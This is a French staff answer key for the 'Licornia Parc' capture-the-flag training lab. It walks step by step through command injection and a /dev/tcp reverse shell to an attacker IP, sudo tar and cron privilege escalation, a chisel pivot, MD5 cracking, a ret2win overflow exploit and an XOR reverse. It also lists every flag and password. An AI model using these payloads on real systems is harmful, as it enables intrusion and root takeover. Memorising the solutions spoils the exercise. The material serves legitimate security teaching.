# Walkthrough STAFF — lab découverte « Licornia Parc »

> **Corrigé complet, pas à pas.** Document réservé à l'encadrement. Point de vue
> **attaquant depuis une Kali** : le joueur ne reçoit **que l'IP:port du service
> `web`** (le reste du LAN se gagne par compromission + pivot).
>
> Pour chaque flag, le bloc *(rejeu staff)* donne l'équivalent `docker exec` validé
> (tiré de `scripts/verify-chain.sh`, qui rejoue toute la chaîne automatiquement :
> `make test-chain`). Adresses **autonomes** : `web=172.31.10.10`,
> `firewall=172.31.10.2 / .20.2`, `files=172.31.20.11`, `admin=172.31.20.12`.
> Sous CTFd les subnets/port sont réécrits par équipe — la logique reste identique.

Notation : `$TARGET` = IP:port du point d'entrée (ex. `http://192.168.1.60:8080`),
`$WEB` = IP/host du service web.

---

## Acte 0 — Reconnaissance du point d'entrée

```bash
# On ne connaît QUE le point d'entrée.
nmap -sV -sC -p- $WEB_IP            # 80/tcp (Apache/PHP). Le SSH n'est pas exposé aux joueurs.
whatweb http://$WEB_IP:8080/
gobuster dir -u http://$WEB_IP:8080/ -w /usr/share/wordlists/dirb/common.txt -x php
```

Pages utiles découvertes : `/` (accueil), `/equipe.php` (**OSINT**),
`/outils.php` (**outil de diagnostic réseau** → injection), `/brochure-licornia.jpg`.

---

## Acte 1 — web01 (DMZ) : Web → OSINT → Encodage → root

### Flag 1 — `FLAG_WEB_RCE` · [Web] injection de commande → www-data  *(spine)*

`/outils.php` exécute `shell_exec("ping -c 2 " . $host)` sans aucun filtrage : le
paramètre `host` est concaténé tel quel → **injection de commande**.

```bash
# Lecture du flag user (séparateur ';' ou '|' ou '&&')
curl -s "http://$WEB_IP:8080/outils.php" --data-urlencode 'host=127.0.0.1;cat /var/www/flag_user.txt' -G
# → ... AMSI{web_cmdi_rev_shell_dev}

# Reverse shell complet (sur la Kali : nc -lvnp 4444)
curl -s "http://$WEB_IP:8080/outils.php" \
  --data-urlencode 'host=;bash -c "bash -i >& /dev/tcp/<IP_KALI>/4444 0>&1"' -G
```

On obtient un shell **www-data** sur web01.

> *(rejeu staff)* `curl -s "$B/outils.php" --data-urlencode 'host=127.0.0.1;cat /var/www/flag_user.txt' -G`

### Flag 2 — `FLAG_WEB_REVERSE` · [OSINT] métadonnées EXIF  *(bonus)*

`/equipe.php` révèle la **convention de login** : *première lettre du prénom + `.` +
nom* (ex. `a.pommier`). La **brochure** téléchargeable porte le flag dans ses
métadonnées EXIF.

```bash
wget http://$WEB_IP:8080/brochure-licornia.jpg
exiftool brochure-licornia.jpg
# Artist : a.pommier
# Comment : Licornia Parc - usage interne. Note compo: AMSI{osint_exif_equipe_dev}
```

> *(rejeu staff)* `docker exec web exiftool -s3 -Comment /var/www/app/public/brochure-licornia.jpg`

### Flag 3 — `FLAG_WEB_ROOT` · [Encodage + Privesc] base64 + sudo tar GTFOBins  *(spine)*

Depuis le shell www-data, on fouille la conf laissée par le développeur (Théo) :

```bash
cat /var/www/app/config/backup.inc.php
# $SMB_CREDENTIALS_B64 = 'YS5wb21taWVyOmFwcGxlamFjaw==';
echo 'YS5wb21taWVyOmFwcGxlamFjaw==' | base64 -d
# a.pommier:applejack     ← /!\ leçon : base64 = ENCODAGE, pas chiffrement
```

> Ces identifiants `a.pommier:<mdp>` resserviront sur le LAN (SMB/SSH). Le mot de
> passe exact dépend de l'instance (`A_POMMIER_PW`, `applejack` en autonome).

Élévation locale via `sudo -l` :

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/tar
# GTFOBins : tar permet d'exécuter une commande via --checkpoint-action
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
# id → uid=0(root)
cat /root/flag_root.txt
# AMSI{sudo_gtfobins_root_web_dev}
```

> *(rejeu staff)* `docker exec -u www-data web sh -c 'sudo -n tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec="sh -c \"id; cat /root/flag_root.txt\""'`

---

## Acte 1.5 — Le PIVOT (web01 → LAN)

web01 possède une **route vers le LAN** (`172.31.20.0/24 via 172.31.10.2`, posée par
son entrypoint avec `NET_ADMIN`). Le LAN n'est **pas publié** : on l'atteint **par
web01**. ⚠️ web01 n'expose **aucun compte SSH** (root verrouillé, `www-data` sans
shell) : on ne « saute » donc **pas** par un `ssh -J ...@web01`. On pivote par le
**shell déjà obtenu** sur web01 (www-data → root). Deux approches :

```bash
# 1) Reco depuis le shell web (déjà sur place, sans rien téléverser)
for h in 11 12; do (echo > /dev/tcp/172.31.20.$h/22) 2>/dev/null && echo "172.31.20.$h:22 ouvert"; done
#   → .11 (files: 445/22), .12 (admin: 22)
#   web01 a aussi un client ssh + smbclient : on peut déjà agir DIRECTEMENT depuis lui.

# 2) Tunnel SOCKS avec chisel (méthode reine — outils de la Kali via le pivot) :
#    Kali:   ./chisel server -p 8000 --reverse
#    web01:  ./chisel client <IP_KALI>:8000 R:1080:socks      # lancé depuis le shell web
#    Kali:   proxychains smbclient -N -L //172.31.20.11
#            proxychains ssh -i id_admin c.vasseur@172.31.20.12

# 3) ssh -J devient utile UNE FOIS qu'on a un VRAI compte SSH dans le LAN :
#    files expose le compte a.pommier (mdp craqué) → on peut rebondir par files
#    pour atteindre admin (via le tunnel de l'étape 2) :
#    proxychains ssh -J a.pommier@172.31.20.11 -i id_admin c.vasseur@172.31.20.12
```

> Pédagogie : l'important est de **comprendre** qu'on rebondit par la machine
> compromise. Le franchissement DMZ→LAN se fait par le **shell sur web01** (chisel/
> proxychains, ou en agissant directement depuis web01) — pas par un saut SSH sur
> web01 qui n'a aucun compte exposé. `ssh -J` ne sert qu'à rebondir **dans** le LAN
> (via `a.pommier@files`) une fois le tunnel établi.

---

## Acte 2 — fileshare (LAN) : Recon → Forensique → Stégano → Crypto → root

> Toutes les commandes ci-dessous se lancent **à travers le pivot** (`proxychains …`),
> ou directement depuis un shell sur web01. On vise `172.31.20.11`.

### Flag 4 — `FLAG_FILES_RECON` · [Recon SMB anonyme]  *(spine)*

```bash
smbclient -N -L //172.31.20.11             # partages : public (ok), rh (réservé)
smbclient -N //172.31.20.11/public
smb> get note-interne.txt
smb> mget capture.pcap photo-poney.jpg
smb> cd backup; get hashes.txt
# note-interne.txt :
#   Le partage RH est réservé à a.pommier. Token de recon : AMSI{smb_anon_recon_dev}
```

> *(rejeu staff)* `docker exec files sh -c 'smbclient -N //127.0.0.1/public -c "get note-interne.txt -"'`

### Flag 5 — `FLAG_DB_PIVOT` · [Forensique réseau, pcap en clair]  *(bonus)*

```bash
strings capture.pcap | grep -iE 'pass|login|AMSI'
# … login de l'agent de sauvegarde en CLAIR …  AMSI{pcap_clear_login_dev}
# (ou Wireshark → Follow TCP Stream sur l'échange HTTP)
```

> *(rejeu staff)* `docker exec files sh -c 'strings /srv/public/capture.pcap' | grep AMSI`

### Flag 6 — `FLAG_DB_ROOT` · [Stéganographie, données appendues]  *(bonus)*

```bash
binwalk photo-poney.jpg        # données après la fin du JPEG
strings photo-poney.jpg | tail
# --- Licornia steg ---
# passphrase: p0ney-cache
# FLAG: AMSI{stego_image_hidden_dev}
```

> *(rejeu staff)* `docker exec files sh -c 'strings /srv/public/photo-poney.jpg' | grep AMSI`

### Flag 7 — `FLAG_FILES_RCE` · [Crypto : cassage de hash MD5]  *(spine)*

```bash
cat hashes.txt
# a.pommier:385ee445120fea7c254ef1b7abca15bb   (md5 de 'applejack')
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
# a.pommier : applejack
# (ou : hashcat -m 0 hashes.txt rockyou.txt)

# Le mot de passe craqué = compte SMB/SSH a.pommier → accès au partage RH :
smbclient //172.31.20.11/rh -U 'a.pommier%applejack' -c 'get flag_rce.txt -'
# Acces RH confirme. AMSI{md5_crack_rockyou_dev}
```

> *(rejeu staff)* `docker exec files su a.pommier -c 'cat /srv/rh/flag_rce.txt'`
> (le hash en base est `md5(A_POMMIER_PW)` ; en autonome `applejack`.)

### Flag 8 — `FLAG_FILES_ROOT` · [Privesc : cron + script world-writable]  *(spine)*

Connecté en `a.pommier` (SSH avec le mot de passe craqué), on inspecte le cron :

```bash
ssh a.pommier@172.31.20.11        # mot de passe : applejack
ls -l /opt/licornia/maintenance.sh
# -rw-rw-rw- 1 root root ...  ← WORLD-WRITABLE, lancé par cron ROOT chaque minute
cat /etc/cron.d/licornia-maint
# * * * * * root /bin/sh /opt/licornia/maintenance.sh

# On injecte une commande exécutée par root au prochain tick (~1 min) :
echo 'cp /root/flag_root.txt /tmp/f.txt; chmod 644 /tmp/f.txt' >> /opt/licornia/maintenance.sh
echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' >> /opt/licornia/maintenance.sh
sleep 65
cat /tmp/f.txt                    # AMSI{cron_writable_root_dev}
/tmp/rootbash -p                  # euid=0 → root persistant
```

Loot root pour la suite (clé SSH de la directrice) :

```bash
cat /root/notes-admin.txt
#   J'accède à mon poste admin en SSH : ssh -i id_admin c.vasseur@172.31.20.12
cp /root/id_admin ~/ ; chmod 600 id_admin
```

> *(rejeu staff, sans attendre le tick)* on exécute le script en root (= ce que fait
> cron) après injection : voir `verify-chain.sh` (« cron root + script world-writable »).

---

## Acte 3 — admin / workstation (LAN) : SSH → Pwn → Reverse → domaine

### Accès — rebond SSH par clé lootée

```bash
ssh -i id_admin -o StrictHostKeyChecking=no c.vasseur@172.31.20.12
# (via le pivot : proxychains ssh -i id_admin c.vasseur@172.31.20.12)
id    # uid=1000(c.vasseur)  ← compte non privilégié
```

> *(rejeu staff)* `docker exec files ssh -i /root/id_admin -o StrictHostKeyChecking=no c.vasseur@172.31.20.12 id`

### Flag 9 — `FLAG_WS_ROOT` · [Pwn : buffer overflow ret2win]  *(spine)*

`/usr/local/bin/vault` est **SUID root**. Source : `read(0, buf, 0x100)` dans un
`buf[64]`, compilé `-fno-stack-protector -no-pie -O0`. Une fonction `win()` fait
`setuid(0); execve("/bin/sh")`.

```bash
# Analyse : adresse de win()
objdump -d /usr/local/bin/vault | grep -A1 '<win>:'    # 0000000000401196 <win>:
# (ou : nm /usr/local/bin/vault | grep win)
# Offset = 64 (buf) + 8 (rbp sauvé) = 72, puis l'adresse de retour.

# Exploit. Subtilité VALIDÉE : read() lit jusqu'à 256 octets ; si on envoie le
# payload ET les commandes d'un coup, read() avale tout et le shell n'a plus de
# stdin. On envoie donc le payload, on PAUSE (read rend la main sur ~80 octets),
# PUIS on parle au shell root.
{ python3 -c "import sys;sys.stdout.buffer.write(b'A'*72+(0x401196).to_bytes(8,'little'))";
  sleep 1; echo 'id; cat /root/flag_root.txt'; sleep 1; } | /usr/local/bin/vault
# uid=0(root) ...
# AMSI{bof_ret2win_root_dev}
```

Variante propre avec **pwntools** :

```python
from pwn import *
io = process('/usr/local/bin/vault')          # ou remote via le pivot
io.send(b'A'*72 + p64(0x401196)); time.sleep(0.5)
io.sendline(b'id; cat /root/flag_root.txt'); print(io.recvall(timeout=2).decode())
```

> *(rejeu staff)* l'adresse de `win()` est extraite dynamiquement par
> `verify-chain.sh` (objdump sur l'hôte), repli `0x401196`.

### Flag 10 — `FLAG_FINAL` · [Reverse engineering : XOR]  *(spine)*

`/usr/local/bin/licornia-check` (SUID root) compare l'entrée à un tableau `enc[]`
**XORé** avec une clé d'un octet ; si ça correspond, il lit le **trophée**
`/opt/licornia/trophy`.

```bash
# Reverse (Ghidra / objdump) : on récupère enc[] et la clé (0x5b).
python3 -c "
enc=[0x2f,0x2c,0x32,0x37,0x32,0x3c,0x33,0x2f,0x76,0x28,0x2b,0x3a,0x29,0x30,0x37,0x3e,0x76,0x6f,0x69]
print(''.join(chr(b^0x5b) for b in enc))"
# twilight-sparkle-42      ← mot de passe maître de l'annuaire

echo 'twilight-sparkle-42' | /usr/local/bin/licornia-check
# Acces annuaire accorde (prise du domaine).
# === PRISE DU DOMAINE LICORNIA ===
# AMSI{reverse_domain_takeover_dev}
```

> *(rejeu staff)* `printf 'twilight-sparkle-42\n' | docker exec -i -u c.vasseur workstation /usr/local/bin/licornia-check`

---

## Récapitulatif de la chaîne

| # | Flag (env) | Catégorie | Machine | Gating |
|---|---|---|---|---|
| 1 | `FLAG_WEB_RCE`     | Web (injection cmd)        | web   | **spine** |
| 2 | `FLAG_WEB_REVERSE` | OSINT (EXIF)               | web   | bonus |
| 3 | `FLAG_WEB_ROOT`    | Encodage + Privesc (tar)   | web   | **spine** |
| 4 | `FLAG_FILES_RECON` | Recon SMB anonyme          | files | **spine** |
| 5 | `FLAG_DB_PIVOT`    | Forensique (pcap)          | files | bonus |
| 6 | `FLAG_DB_ROOT`     | Stéganographie             | files | bonus |
| 7 | `FLAG_FILES_RCE`   | Crypto (MD5/rockyou)       | files | **spine** |
| 8 | `FLAG_FILES_ROOT`  | Privesc (cron writable)    | files | **spine** |
| 9 | `FLAG_WS_ROOT`     | Pwn (BOF ret2win)          | admin | **spine** |
| 10| `FLAG_FINAL`       | Reverse (XOR) → domaine    | admin | **spine** |

**Spine obligatoire (déblocage linéaire dans CTFd) :** 1 → 3 → 4 → 7 → 8 → 9 → 10.
**Bonus (couvrent OSINT / Forensique / Stégano) :** 2, 5, 6 — non bloquants.

> Les valeurs `…_dev` ci-dessus sont celles du mode **autonome** (`.env.example`).
> En production CTFd, chaque équipe reçoit des flags **uniques** dérivés de son jeton
> (`AMSI{<slug>_<jeton>}`) — la mécanique d'exploitation est identique.

## Tout rejouer automatiquement

```bash
make up            # build + démarre l'infra (3 machines + firewall)
make test          # invariants réseau (pivot ouvert, seul web publié) — verify-firewall.sh
make test-chain    # rejoue les 10 étapes et vérifie chaque flag — verify-chain.sh
```
